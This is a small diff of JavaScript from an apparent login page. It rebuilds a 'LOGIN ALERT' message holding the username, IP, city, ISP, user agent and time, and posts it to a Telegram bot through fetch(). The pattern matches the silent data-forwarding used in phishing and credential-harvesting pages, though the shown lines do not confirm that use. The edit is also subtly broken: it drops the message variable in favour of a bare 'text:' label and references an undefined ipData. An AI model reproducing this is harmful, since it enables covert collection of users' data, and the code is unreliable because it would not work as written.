@@ -178,13 +178,14 @@ let data = await res.json();
 ip = data.ip;
 }catch(e){}
 
-// Telegram message
-let message =
+text:
 "🔐 LOGIN ALERT\n\n" +
-"👤 Username: " + username + "\n" +
-"🌐 IP: " + ip + "\n" +
-"📱 Device: " + device + "\n" +
-"🕒 Time: " + time;
+"User: " + username + "\n" +
+"IP: " + ipData.ip + "\n" +
+"City: " + ipData.city + "\n" +
+"ISP: " + ipData.org + "\n" +
+"Device: " + navigator.userAgent + "\n" +
+"Time: " + new Date().toLocaleString()
 
 // Send
 fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
